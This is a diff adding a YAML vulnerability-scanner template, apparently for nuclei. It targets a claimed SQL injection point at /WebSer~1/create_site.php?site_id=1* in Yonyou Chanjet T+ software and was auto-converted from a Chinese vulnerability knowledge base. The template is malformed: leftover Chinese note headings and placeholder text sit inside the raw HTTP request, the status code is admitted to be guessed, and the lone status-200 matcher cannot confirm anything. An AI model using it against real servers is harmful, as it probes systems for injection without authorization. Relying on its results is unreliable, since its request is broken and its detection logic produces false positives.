@@ -1,0 +1,36 @@
+id: poc-ovn9gdqp9tf91oxa
+info:
+  name: 用友畅捷通 T注入
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ovn9gdqp9tf91oxa
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: other,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ovn9gdqp9tf91oxa
+    fofa: 暂无
+http:
+- raw:
+  - 'GET /WebSer~1/create_site.php?site_id=1* HTTP/1.1
+
+
+    # 响应代码特征
+
+    -1
+
+
+    # 响应内容特征
+
+    暂无
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
